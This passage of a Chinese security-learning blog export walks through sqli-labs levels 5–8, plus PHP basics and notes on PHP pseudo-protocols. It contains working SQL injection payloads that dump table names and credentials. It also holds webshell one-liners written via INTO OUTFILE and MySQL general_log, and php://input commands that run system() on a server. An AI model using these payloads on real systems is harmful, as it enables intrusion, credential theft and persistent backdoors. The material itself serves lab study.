在可回显的字段里换成 database () union select 1,database(),3 也和前三关一样也就不一一列出了 得到数据库名称为 database () # 获取所有的数据 这里的操作和前三关都一样就不一一列出了 # sqli-labs-5 # 本关涉及内容 # updatexml() updatexml(xml_doument,XPath_string,new_value) 第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称，文中为 Doc 第二个参数：XPath_string (Xpath 格式的字符串) ，如果不了解 Xpath 语法，可以在网上查找教程。 第三个参数：new_value，String 格式，替换查找到的符合条件的数据 updatexml(xml_doument,XPath_string,new_value) 第一个参数：XML 的内容 第二个参数：是需要 update 的位置 XPATH 路径 第三个参数：是更新后的内容 所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合 XPATH 格式 函数利用和语法明白了，下面注入的 payload 就清楚明白 updatexml 最多只能显示 32 位，需要配合 SUBSTR 使用 # concat() 用于连接字符串 # substr() 1substr(strings|express,m,[n]) strings|express ：被截取的字符串或字符串表达式 m ：从第 m 个字符开始截取 n ：截取后字符串长度为 n # select distinct() 这个函数本关可以不用到，但是看到了就把他记下来 用法如下： SELECT DISTINCT 表示查询结果中，去掉了重复的行 百度的一个例子： 如果要从 “Company” 列中选取所有的值，我们需要使用 SELECT 语句： 1SELECT Company FROM Orders Orders Company Num IBM 3532 W3School 2356 Apple 4698 W3School 6953 结果 Company IBM W3School Apple W3School 请注意，在结果集中，W3School 被列出了两次。 如需从 Company&quot; 列中仅选取唯一不同的值，我们需要使用 SELECT DISTINCT 语句： 1SELECT DISTINCT Company FROM Orders 结果 Company IBM W3School Apple 在结果集中，“W3School” 仅被列出了一次。 # 初步判断 输入正确的 id 1url?id=1 页面显示 You are in… 说明本关不回显 添加’后，发现页面还是会报错的 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘‘1’’ LIMIT 0,1’ at line 1 可以看出本关还是单引号闭合 # 获取数据库名称 这里用到报错注入 1url?id=1&#x27; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) --+ 此时页面显示 XPATH syntax error: ‘security’ 得到数据库名称为 security # 获取所有表名 这里用到 updatexml () 1url?id=1&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27;),1,31),0x7e),1) --+ 因为 updatexml () 函数只能显示 32 位，防止一次性爆出所有表名太长了这里使用 substr () 限制输出的位数 页面显示 XPATH syntax error: ‘emails,referers,uagents,users’ 得到所有的表名为 emails,referers,uagents,users # 获取 users 所有列名 这里采用 limit 0,1 限制一次性爆出列名的数量 1url?id=1&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name = &#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 0,1),0x7e),3) --+ 页面显示 XPATH syntax error: ‘id’ 按顺序增加 limit 1,1 limit 2,1 … 直到页面异常 可以得出所有的列名为 id,username,password 这里再尝试一下 group_concat 看看能不能一次性爆出所有的列名，看网上的教程说报错注入不能使用 group_concat 一次性获取所有的列名，尝试一下会出现什么情况 1?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27; and table_schema=&#x27;security&#x27;),0x7e),3) --+ 页面显示 XPATH syntax error: ‘id,username,password’ 得出还是能正常使用并得出所有列名的，我猜测应该是 updatexml () 只能显示 32 位，刚好这些列名没有超出 32 位就没有什么问题了 这里有使用 updatexml () 和 group_conat () 来获取 users 表里的所有 username 来验证一下 1url?id=1&#x27; and updatexml(1,concat(0x7e,(select concat(0x7e,(select group_concat(username)),0x7e) from users),0x7e),3) --+ 页面显示 XPATH syntax error: ‘~~Dumb,Angelina,Dummy,secure,stu’ 很明显可以看出 username 没有完全爆出，这里数了一下’‘里的内容确实只有 32 位 证明我的想法可能是对的’’ 好了，回归正题 # 获取所有 username 和 password 既然上面验证了 updatexml 和 group_concat 同时使用可能会发生的事情，这里就不会 “误入歧途” 了 直接用 limit 依次获取所有的 username 和 password 1url?id=1&#x27; and updatexml(1,concat(0x7e,(select (select concat(username,0x7e,password)) from users limit 0,1),0x7e),3) --+ 页面显示 XPATH syntax error: ‘DumbDumb~’ 得出第一组 username 和 password 为 Dumb 和 Dumb 下面就不一一列出了就是 limit 1,1、limit 2,1 按顺序加上去就好了 # 写入 webshell 1url?id=1&#x27; into outfile &#x27;C:/less5.php&#x27; lines terminated by 0x3c3f7068702061737365727428245f504f53545b6c657373355d293b3f3e --+ 这里的这串 16 进制 0x3c3f7068702061737365727428245f504f53545b6c657373355d293b3f3e 通过 16 进制转字符串可翻译为 1&lt;?php assert($_POST[less5]);?&gt; # 写入 webshell 归纳 # 1、union select 写入 这是最常见的写入方式，union 跟 select into outfile，将一句话写入 shell.php，仅适用于联合注入 条件：secure_file_priv 支持 web 目录文件导出，数据库 File 权限，获取物理路径 命令： 1url?id=1&#x27; union select 1,&quot;&lt;?php @eval($_GET[&#x27;cmd&#x27;])?&gt;&quot; into outfile &#x27;E:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\DVWA-master\\\\cmd.php&#x27; --+ # Lines terminated by 写入 当 mysql 注入点为盲注或报错，Union select 写入是不能利用的，那么可以通过分隔符写入，SQLMAP 的–os-shell 命令，所采用的就是这种方式 条件：secure_file_priv 支持 web 目录文件导出，数据库 File 权限，获取物理路径 命令: 1url?id=1&#x27; into outfile &#x27;E:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\DVWA-master\\\\321.php&#x27; lines terminated by &#x27;&lt;?php phpinfo(); ?&gt;&#x27;--+ 注入原理：通过 select 语句查询的内容写入文件，也就是 1’ into outfile 'E:\\phpStudy\\PHPTutorial\\WWW\\DVWA-master\\aaa.php’这样写的原因，然后利用 lines terminated by 语句进行拼接，拼接后面的 webshell 内容 # 3、lines starting by 写入 命令： 1url?id=1&#x27; into outfile &#x27;E:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\DVWA-master\\\\123.php&#x27; lines starting by &#x27;&lt;?php phpinfo() ?&gt;&#x27;--+ 注入原理：利用 lines starting by 语句进行拼接，拼接后面的 webshell 内容，lines starting by 可以理解成以每行开始的位置添加 xx 语句 # 4、fields terminated by 写入 命令： 1url?id=1&#x27; into outfile &#x27;E:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\DVWA-master\\\\kuku.php&#x27; fields terminated by &#x27;&lt;?php phpinfo() ?&gt;&#x27;--+ 注入原理：利用 fields terminated by 语句进行拼接，拼接后面的 webshell 内容，fields terminated by 可以理解为以每个字段的位置添加 xx 内容 # 5、COLUMNS terminated by 写入 命令： 1url?id=1&#x27; into outfile &#x27;E:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\DVWA-master\\\\hao.php&#x27; COLUMNS terminated by &#x27;&lt;?php phpinfo() ?&gt;&#x27;-- 注入原理：利用 COLUMNS terminated by 语句进行拼接，拼接后面的 webshell 内容，COLUMNS terminated by 可以理解为以每个字段的位置添加 xx 内容 # 6、利用 log 写入 新版本的 MYSQL 设置了导出文件的路径，很难在获取 webshell 过程中去修改配置的文件，无法通过使用 select into outfile 来写入一句话，这时我们可以通过修改 MYSQL 的 log 文件来获取 Webshell 条件：数据库用户需具备 Super 和 File 服务器的权限，获取物理路径 12345show variables like &#x27;%general%&#x27;; #查看配置set global general_log = on; #开启general log模式 set global general_log_file = &#x27;E:/phpStudy/PHPTutorial/WWW/DVWA-master/evil.php&#x27;; #设置日志目录为shell地址select &#x27;&lt;?php phpinfo() ?&gt;&#x27; #写入shellset global general_log=off; #关闭general log模式 写入 webshell 学习于：https://blog.csdn.net/bring_coco/article/details/114756692 # sqli-labs-6 # 初步判断 输入正确的 id 1url?id=1 页面显示： You are in… 说明本关不回显 添加’,&quot;后发现&quot; 输入后页面显示报错 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1&quot;” LIMIT 0,1’ at line 1 说明需要闭合的是双引号 # 获取数据库名称 使用报错注入得到数据库名称 1url?id=1&quot; and updatexml(1,concat(0x7e,(select database()),0x7e),3) --+ 页面显示： XPATH syntax error: ‘security’ 从而得知数据库名称为 security # 获取所有表名 1url?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27;),1,31),0x7e),3) --+ 页面显示： XPATH syntax error: ‘emails,referers,uagents,users’ 得到所有的表名为 emails,referers,uagents,users # 获取 users 表中的所有列名 1url?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27; and table_schema = &#x27;security&#x27;),1,31),0x7e),3) --+ 页面显示： XPATH syntax error: ‘id,username,password’ 得到 users 表中的所有列名为 id,username,password # 获取 users 表中的所有 username 和 password 1url?id=1&quot; and updatexml(1,concat(0x7e,(select (concat(username,&#x27;^&#x27;,password)) from users limit 0,1),0x7e),3) --+ 页面显示： XPATH syntax error: ‘Dumb^Dumb’ 改变 limit 后面的数字 limit 1,1、limit 2,1 。。。 获取所有的 username 和 password # 写入 webshell 1url?id=1&quot; into outfile &#x27;C:/less6.php&#x27; lines terminated by 0x3c3f7068702061737365727428245f504f53545b4c657373365d293b203f3e --+ 可以在相关路径找到对应 php 文件，0x 开头的十六进制符号可以用 16 进制转字符翻译 # sqli-labs-7 # 初步判断 输入正确的 id 1url?id=1 页面显示： You are in… Use outfile… 加入’ 页面显示： You have an error in your SQL syntaxYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘‘1’’)) LIMIT 0,1’ at line 1 说明是 ((’’)) 闭合 # 获取数据库名称 运用报错注入 1url?id=1&#x27;)) and updatexml(1,concat(0x7e,(select database()),0x7e),3) --+ 页面显示： You have an error in your SQL syntaxXPATH syntax error: ‘security’ 得到数据库名称为 security # 获取所有表名 1url?id=1&#x27;)) and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27;),1,31),0x7e),3) --+ 页面显示： You have an error in your SQL syntaxXPATH syntax error: ‘emails,referers,uagents,users’ 得到所有的表名为 emails,referers,uagents,users # 获取 users 表中的所有列名 1url?id=1&#x27;)) and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27; and table_schema = &#x27;security&#x27;),1,31),0x7e),3) --+ 页面显示： You have an error in your SQL syntaxXPATH syntax error: ‘id,username,password’ 可以知道 users 表中所有的列名为 id,username,password # 获取 users 表中的所有 username 和 password 1url?id=1&#x27;)) and updatexml(1,concat(0x7e,(select concat(username,&#x27;^&#x27;,password) from users limit 0,1),0x7e),3) --+ 页面显示： You have an error in your SQL syntaxXPATH syntax error: ‘Dumb^Dumb’ 得到第一组 username 和 password 为 Dumb^Dumb 接着更改 limit 后面的数字获取所有的 username 和 password # 写入 webshell 1url?id=1&#x27;)) into outfile &#x27;C:/Less7.php&#x27; lines terminated by 0x3c3f7068702061737365727428245f504f53545b4c657373375d293b203f3e --+ # sqli-labs-8 # 初步判断 输入正确的 id 1url?id=1 页面显示： You are in… 说明本题不回显 加上’ 页面显示异常，本题报错不回显 输入–+ 页面显示正常 说明有包装 本题需要我们使用盲注来获取信息 # 获取数据库名称 先判断数据库名称的长度 1url?id=1&#x27; and (length(database()))=1 --+ 从 1 一直到 8 时 此时页面显示 you are in… 说明数据库名称长度为 8 用 left 获取数据库名称从左到右的字符这里（也可以使用 ascii 等） 1url?id=1&#x27; and left((select database()),1)=&#x27;s&#x27; --+ 依次增加数字和尝试后面的字符，可以配合 &gt;,&lt;,=, 二分法一起使用 如 url?id=1’ and left ((select database ()),1)&gt;‘a’ --+ 最终可以得到 1url?id=1&#x27; and left((select database()),8)=&#x27;security&#x27; 即数据库名称等于 security # 获取所有信息 除此之外我们还可以获得所有数据库的名称，使用同样的方法去一个一个才出来，也可以使用 sqlmap 直接跑，获取所有的内容 如果手工注入可能花费的时间比较久 payload 如下： 12345678//获取所有数据库名称url?id=1&#x27; and left((select schema_name from information_schema.schemata limit 0,1),5)=&#x27;mysql&#x27; --+ //查出来本地的第一个数据库为mysql//获取security数据库下的所有表名?id=1&#x27; and left((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1)&gt;&#x27;a&#x27; --+//获取security数据库users表下的所有列名?id=1&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 0,1),1)&gt;&#x27;a&#x27; --+//获取所有username和password?id=1&#x27; and left((select username from users limit 0,1),1)&gt;&#x27;a&#x27; --+","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://dr4x3zz.github.io/categories/sqli-labs/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://dr4x3zz.github.io/tags/sqli-labs/"}]},{"title":"php学习2022-12-21","slug":"php学习2022-12-21","date":"2022-12-21T08:09:10.000Z","updated":"2022-12-24T04:18:34.000Z","comments":true,"path":"2022/12/21/php学习2022-12-21/","link":"","permalink":"https://dr4x3zz.github.io/2022/12/21/php%E5%AD%A6%E4%B9%A02022-12-21/","excerpt":"# php 学习 (常量、运算符、字符串函数) #","text":"# php 学习 (常量、运算符、字符串函数) # # 常量 设置常量通常用 define () 函数 define (“常量的名称”,“常量的值”,(可定义为 true 也可不写)); 例： 12345678910111213&lt;?php define(&quot;kx&quot;,&quot;czk Love ltx&quot;); //常量名不需要加$,且常量是全局的 echo kx; //输出：czk Love ltx echo &#x27;&lt;br&gt;&#x27;; echo KX; //无法输出，未定义大写 echo &#x27;&lt;br&gt;&#x27;; define(&quot;tz&quot;,&quot;czk Love ltx&quot;, true); echo tz; //输出：czk Love ltx echo &#x27;&lt;br&gt;&#x27;; echo TZ; //输出：czk Love ltx echo &#x27;&lt;br&gt;&#x27;; ?&gt; 1. 第一个”” 是 name: 必选参数，常量名称，即标志符’ 2. 第二个”” 是 value：必选参数，常量的值。 3. 最后一个交 case_insensitive, 可选参数，如果设置为 TRUE，该常量则大小写不敏感，默认是大小写敏感的。 # 运算符 # 与 c 语言大致相同的运算符 ‘+’加 ‘-’减 ‘*’乘 ‘/’除 ‘%’取余 与 c 基本相同 赋值运算符也与 c 语言大致相同 递增 / 递减运算符也与 c 语言大致相同 比较运算符也大致与 c 相同 另外：‘&lt;&gt;’不等于 ‘！==’不全等 (完全不同) 逻辑运算符，大致也与 c 相同 ‘and’与 ‘or’或 ‘xor’异或 ‘&amp;&amp;’与 ‘||’或 ‘!’非 # 和 = 在 php 中 使用两个等号（）比较，只比较值，不比较类型 用三个等号（=）比较，都比较 例： 12345678910111213141516&lt;?php if(42 == &quot;42&quot;) &#123; echo &#x27;值相等&#x27;; &#125; echo &#x27;&lt;br&gt;&#x27;; if(42 === &quot;42&quot;) &#123; echo &#x27;类型相等&#x27;; &#125; else &#123; echo &#x27;类型不相等&#x27;; &#125; echo &#x27;&lt;br&gt;&#x27;;?&gt; 输出为：值相等 类型不相等 # ‘.’串接 ‘.=’串接赋值 1234567891011&lt;?php $txt1 = &quot;Hello World!&quot;; $txt2 = &quot;Hello PHP!&quot;; echo $txt1 . &quot; &quot; . $txt2; //输出Hello World! Hello PHP! echo &#x27;&lt;br&gt;&#x27;; $a = &quot;Hello&quot;; $b = $a . &quot; world!&quot;; echo $b; //输出 Hello world! echo &#x27;&lt;br&gt;&#x27;;?&gt; # intdiv（）函数 intdiv（）函数：该函数返回值为第一个参数除于第二个参数的值并取等（向下取等） 123&lt;?php var_dump(intdiv(10, 3)); //返回值为3?&gt; # 字符串函数 定义一个 txt1, 供下方函数使用 123&lt;?php $txt1 = &quot;Hello World!&quot;;?&gt; # strlen() strlen () 返回字符串的长度 123&lt;?php echo strlen($txt1); //输出字符串长度12?&gt; # str_word_count() str_word_count () 对字符串中的单词进行计数 123&lt;?php echo str_word_count(&quot;$txt1&quot;); //输出2?&gt; # strrev() strrev () 反转字符串 123&lt;?php echo strrev($txt1); //输出!dlroW olleH?&gt; # strpos() strpos () 检索字符串内指定的字符或文本 123&lt;?php echo strpos(&quot;$txt1&quot;,&quot;World&quot;); //输出6?&gt; # str_replace() str_replace () 替换字符串中的文本 1234&lt;?php echo str_replace(&quot;World&quot;,&quot;Kitty&quot;,&quot;$txt1&quot;); //输出Hello Kitty! echo $txt1; //输出：Hello World! 不改变变量的内容?&gt;","categories":[{"name":"php学习","slug":"php学习","permalink":"https://dr4x3zz.github.io/categories/php%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://dr4x3zz.github.io/tags/php%E5%AD%A6%E4%B9%A0/"}]},{"title":"php学习2022-12-20","slug":"php学习2022-12-20","date":"2022-12-20T09:24:03.000Z","updated":"2022-12-24T04:18:32.000Z","comments":true,"path":"2022/12/20/php学习2022-12-20/","link":"","permalink":"https://dr4x3zz.github.io/2022/12/20/php%E5%AD%A6%E4%B9%A02022-12-20/","excerpt":"# php 学习 (EOF、数据变量) #","text":"# php 学习 (EOF、数据变量) # # 打印 Hello World！ 123&lt;?php echo &quot;Hello World!&quot;;?&gt; # php EOF 输出一段要输出的字符可以用 123echo &lt;&lt;&lt;EOF//要输出的字符EOF; 1、EOF 也可以运用其他字母来表示，例如 (EOT、EOD、EOF 等) 2、结尾’;' 必须要输入 例子如下： 123456789101112131415161718&lt;?php $name = &quot;runoob&quot;; $a = &lt;&lt;&lt;EOF &quot;abc&quot;$name &quot;123&quot; EOF; /* 1、以 &lt;&lt;&lt;EOF 开始标记开始，以 EOF 结束标记结束，结束标记必须顶头写， 不能有缩进和空格，且在结束标记末尾要有分号 。 2、开始标记和结束标记相同，比如常用大写的 EOT、EOD、EOF 来表示， 但是不只限于那几个(也可以用：JSON、HTML等)， 只要保证开始标记和结束标记不在正文中出现即可。 3、位于开始标记和结束标记之间的变量可以被正常解析，但是函数则不可以。 在 heredoc 中，变量不需要用连接符 . 或 , 来拼接。 */ echo $a;?&gt; # php 中支持以下几种数据类型 String（字符串） Integer（整型） Float（浮点型） Boolean（布尔型） Array（数组） Object（对象） NULL（空值） Resource（资源类型） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?php//php字符串 $x = &quot;Hello World!&quot;; //可以将任意文本放入单、双引号中 echo $x; echo &quot;&lt;br&gt;&quot;;//php整型 $y = 678; var_dump($y); echo &quot;&lt;br&gt;&quot;; $y = -123; //负数 var_dump($y); echo &quot;&lt;br&gt;&quot;; $y = 0x8C; //十六进制 var_dump($y); echo &quot;&lt;br&gt;&quot;; $y = 047; //八进制 var_dump($y); echo &quot;&lt;br&gt;&quot;; //php浮点型 $z = 10.365; var_dump($z); echo &quot;&lt;br&gt;&quot;; $z = 2.4e3; var_dump($z); echo &quot;&lt;br&gt;&quot;; $z = 8E-5; var_dump($z); echo &quot;&lt;br&gt;&quot;;//php布尔型 $x = true; $y = false; //布尔型通常用于条件判断。//php数组 $cars = array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;); var_dump($cars); echo &quot;&lt;br&gt;&quot;;//php对象 class Car &#123; var $color; function __construct($color = &quot;green&quot;) &#123; $this-&gt;color = $color; &#125; function what_color() &#123; return $this-&gt;color; &#125; &#125;//php NULL值 $x = &quot;Hello World!&quot;; $x = NULL; var_dump($x); echo &quot;&lt;br&gt;&quot;;//php资源类型 /* 1、PHP 资源 resource 是一种特殊变量，保存了到外部资源的一个引用。 2、常见资源数据类型有打开文件、数据库连接、图形画布区域等。 3、由于资源类型变量保存有为打开文件、数据库连接、图形画布区域等的特殊句柄， 因此将其它类型的值转换为资源没有意义。 4、使用 get_resource_type() 函数可以返回资源（resource）类型： */ get_resource_type(resource $handle): string?&gt; # $this-&gt; 的使用 123456789101112131415161718192021&lt;?php //‘-&gt;’符号是“插入式解引用操作符 class User &#123; public $_name; function getName() &#123; echo $this-&gt;name; &#125; &#125; $user1 = new User(); $user1-&gt;name = &#x27;张三&#x27;; $user1-&gt;getName(); //输出张三 echo &#x27;&lt;br&gt;&#x27;; $user2 = new User(); $user2-&gt;name = &#x27;李四&#x27;; $user2-&gt;getName(); //输出李四?&gt;","categories":[{"name":"php学习","slug":"php学习","permalink":"https://dr4x3zz.github.io/categories/php%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://dr4x3zz.github.io/tags/php%E5%AD%A6%E4%B9%A0/"}]},{"title":"php伪协议学习","slug":"php伪协议学习","date":"2022-10-30T11:24:36.000Z","updated":"2023-04-28T13:35:12.000Z","comments":true,"path":"2022/10/30/php伪协议学习/","link":"","permalink":"https://dr4x3zz.github.io/2022/10/30/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/","excerpt":"# php 伪协议学习笔记","text":"# php 伪协议学习笔记 协议 用法 file:// ?file=file://D:phpstuy/WWW/phpcode.txt php://filter ?file=php://filter/read=convert.base64-encode/resource=index.php php://input ?file=php://input [POST DATA] zip:// ?file=zip://D:/phpstudy/WWW/file.zip%23phpcode.txt compress.bzip2:// ?file=compress.bzip2://D:/phpstudy/WWW/file.bz2[or]?file=compress.bzip2://./file.bz2 compress.zlib:// ?file=compress.zlib://D:/phpstudy/WWW/file.gz[or]?file=compress.zlib://./file.gz data:// ?file=data://data://text/plain,[or]?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=也可以?file=data.text/plain,[or]?file=data.text/plain:base64,PD9waHAgcGhwaW5mbyqpPz4= # input 变量 = php://input，然后同时 post 想运行的语句 场景：文件包含 在 bp 中输入 &lt;?php phpinfo () ? &gt; 抓包，就能出现 php input 的信息 执行 pwd 命令可以查看当前目录 Post data 输入 &lt;?php system (“pwd”);? &gt; ls… 可以访问上一级目录 Post data 输入 &lt;?php system (“ls…”);? &gt; ls…/… 访问上一级的上一级目录 Post data 输入 &lt;?php system (“ls…/…”);? &gt; # file 用于访问服务端本地文件，用绝对地址访问 文件包含 访问本地文件 # filter 名称 描述 resource=&lt;要过滤的数据流&gt; 这个参数是必须的。指定了你要筛选过滤的数据流。 read=&lt;独链的筛选列表&gt; 这个参数是可选的。可以设定一个或多个过滤器名称，以（/）分隔 write=&lt;写链的筛选列表&gt; 这个参数是可选的。可以设定一个或多个过滤器名称以（/）分隔 &lt;；两个筛选列表&gt; 任何没有以 read = 或 write = 做前缀的筛选器列表会视情况应用于读或写链。 范式：变量 = php://filter/convert.base64/resource = 文件名 再用 base64 解码器解码","categories":[{"name":"ctfweb","slug":"ctfweb","permalink":"https://dr4x3zz.github.io/categories/ctfweb/"}],"tags":[{"name":"ctfweb","slug":"ctfweb","permalink":"https://dr4x3zz.github.io/tags/ctfweb/"}]},{"title":"php语法学习2022/10/23","slug":"php语法学习2022-10-23","date":"2022-10-23T08:55:37.000Z","updated":"2022-12-24T04:35:24.000Z","comments":true,"path":"2022/10/23/php语法学习2022-10-23/","link":"","permalink":"https://dr4x3zz.github.io/2022/10/23/php%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A02022-10-23/","excerpt":"# php 学习 (global 和 static)","text":"# php 学习 (global 和 static) 123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;h1&gt;My first PHP page&lt;/h1&gt;&lt;?phpecho &quot;Hello World!&quot;;?&gt;&lt;/body&gt;&lt;/html&gt; 1、; 作为一种分隔符，php 代码都必须以分号结尾 2、echo 和 print 是一种在浏览器输出文本的基础指令 3、变量以 $ 符号开始，后面跟着变量的名称 变量名必须以字母或者下划线字符开始 变量名只能包含字母、数字以及下划线（A-z、0-9 和 _ ） 变量名不能包含空格 变量名是区分大小写的（$y 和 $Y 是两个不同的变量） 12345678910111213&lt;?php$x=5;$y=10; function myTest()&#123; global $x,$y; $y=$x+$y;&#125; myTest();echo $y; // 输出 15?&gt; 4、在 PHP 函数内部声明的变量是局部变量，仅能在函数内部访问。 global 关键字用于函数内访问全局变量。 在函数内调用函数外定义的全局变量，我们需要在函数中的变量前加上 global 关键字 123456789101112&lt;?phpfunction test() &#123; static $x=0; echo $x . &quot; &quot;; $x++;&#125;test();test();test();test();?&gt; 5、static() 当一个函数执行完成时，它的所有变量通常都会被删除。 然而，有时需要局部变量不要被删除，要做到这一点，第一次声明变量时使用 static 关键字。 结果：0 1 2 3 学习参照于 https://www.runoob.com/php/php-variables.html","categories":[{"name":"php学习","slug":"php学习","permalink":"https://dr4x3zz.github.io/categories/php%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://dr4x3zz.github.io/tags/php%E5%AD%A6%E4%B9%A0/"}]},{"title":"web学习笔记2022/10/23","slug":"web学习笔记2022-10-23","date":"2022-10-22T17:09:38.000Z","updated":"2023-04-30T15:39:12.000Z","comments":true,"path":"2022/10/23/web学习笔记2022-10-23/","link":"","permalink":"https://dr4x3zz.github.io/2022/10/23/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02022-10-23/","excerpt":"# web 学习笔记","text":"# web 学习笔记 123456789&lt;?phpshow_source(_FLIE_);echo $_GET[&#x27;hello&#x27;];$page=$_GET[&#x27;page&#x27;];while (strstr($page, &quot;php://&quot;)) &#123; $page=str_replace(&quot;php://&quot;, &quot;&quot;, $page); &#125; include($page); ?&gt; show_source ()(与 highlight_file () 函数作用相同) 函数的作用是将括号中的 PHP 文件高亮显示，而_FILE_是 PHP 中的常量，代表本 PHP 文件的绝对路径，因此 show_source (FILE) 即将本 PHP 文件高亮显示。 strstr () 函数：strstr (txt1,txt1,txt1,txt2)，查找 txt2 是否在 txt1 中存在，如果是则返回 txt1 中 txt2 及其后面的部分。因此 while (strstr (page,&quot;php://&quot;))即查找page, &quot;php://&quot;))即查找page,&quot;php://&quot;))即查找 page 变量中有无包含 php：//, 当没有时退出循环。 str_replace () 函数：str_replace (“txt1”,”txt2”,”txt3”), 将 txt3 中的 txt1 换成 txt2。 Include ()(函数 (require ())：引用文件中的内容并显示。 摘自：https://blog.csdn.net/qq_51637038/article/details/119833232?ops_request_misc=%7B%22request%5Fid%22%3A%22166645807016800192236551%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=166645807016800192236551&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2allfirst_rank_ecpm_v1~rank_v31_ecpm-1-119833232-null-null.142v59pc_rank_34_2,201v3control&amp;utm_term=php%E4%B8%ADstrstr%28%24file%2Cdata%29&amp;spm=1018.2226.3001.4187","categories":[{"name":"ctfweb","slug":"ctfweb","permalink":"https://dr4x3zz.github.io/categories/ctfweb/"}],"tags":[{"name":"ctfweb","slug":"ctfweb","permalink":"https://dr4x3zz.github.io/tags/ctfweb/"}]}],"categories":[{"name":"取证","slug":"取证","permalink":"https://dr4x3zz.github.io/categories/%E5%8F%96%E8%AF%81/"},{"name":"渗透","slug":"渗透","permalink":"https://dr4x3zz.github.io/categories/%E6%B8%97%E9%80%8F/"},{"name":"buuctf","slug":"buuctf","permalink":"https://dr4x3zz.github.io/categories/buuctf/"},{"name":"ctf","slug":"ctf","permalink":"https://dr4x3zz.github.io/categories/ctf/"},{"name":"NSSCTF","slug":"NSSCTF","permalink":"https://dr4x3zz.github.io/categories/NSSCTF/"},{"name":"ctfweb","slug":"ctfweb","permalink":"https://dr4x3zz.github.io/categories/ctfweb/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://dr4x3zz.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"},{"name":"upload-labs","slug":"upload-labs","permalink":"https://dr4x3zz.github.io/categories/upload-labs/"},{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://dr4x3zz.github.io/categories/sqli-labs/"},{"name":"春秋云境","slug":"春秋云境","permalink":"https://dr4x3zz.github.io/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/"},{"name":"php学习","slug":"php学习","permalink":"https://dr4x3zz.github.io/categories/php%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"取证","slug":"取证","permalink":"https://dr4x3zz.github.io/tags/%E5%8F%96%E8%AF%81/"},{"name":"渗透","slug":"渗透","permalink":"https://dr4x3zz.github.io/tags/%E6%B8%97%E9%80%8F/"},{"name":"buuctf","slug":"buuctf","permalink":"https://dr4x3zz.github.io/tags/buuctf/"},{"name":"ctf","slug":"ctf","permalink":"https://dr4x3zz.github.io/tags/ctf/"},{"name":"NSSCTF","slug":"NSSCTF","permalink":"https://dr4x3zz.github.io/tags/NSSCTF/"},{"name":"ctfweb","slug":"ctfweb","permalink":"https://dr4x3zz.github.io/tags/ctfweb/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://dr4x3zz.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"upload-labs","slug":"upload-labs","permalink":"https://dr4x3zz.github.io/tags/upload-labs/"},{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://dr4x3zz.github.io/tags/sqli-labs/"},{"name":"春秋云境","slug":"春秋云境","permalink":"https://dr4x3zz.github.io/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/"},{"name":"php学习","slug":"php学习","permalink":"https://dr4x3zz.github.io/tags/php%E5%AD%A6%E4%B9%A0/"}]}